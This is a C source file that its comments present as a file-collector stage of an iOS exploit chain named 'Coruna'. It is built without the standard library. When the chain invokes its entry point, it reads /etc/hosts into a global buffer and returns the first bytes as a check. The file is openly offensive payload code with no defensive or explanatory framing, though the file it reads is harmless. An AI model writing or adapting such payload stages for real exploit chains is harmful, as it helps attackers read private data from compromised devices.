// collector_v2.c - File reader for Coruna exploit chain
// Uses raw syscalls (no headers needed)
// Compiled with -nostdlib, linked against iOS SDK

extern int open(const char *path, int oflag, ...);
extern long long read(int fd, void *buf, long long count);
extern int close(int fd);

#define O_RDONLY 0

// Global variable - forces __DATA segment creation
static volatile int _data_marker = 0xDEADBEEF;

// Buffer for file data (in __DATA segment)
static unsigned char _file_buf[4096];
static int _file_size = 0;

// Entry point called by Coruna exploit chain
// Reads /etc/hosts, stores in _file_buf, returns first 4 bytes
int process(void *arg) {
    // Reset
    _file_size = 0;
    for (int i = 0; i < 4096; i++) _file_buf[i] = 0;
    
    // Open /etc/hosts
    int fd = open("/etc/hosts", O_RDONLY);
    if (fd < 0) return -1;
    
    // Read file
    long long n = read(fd, _file_buf, 4095);
    close(fd);
    
    if (n <= 0) return -2;
    
    _file_size = (int)n;
    _file_buf[n] = 0; // null terminate
    
    // Return first 4 bytes as int (for verification)
    return *(int*)_file_buf;
}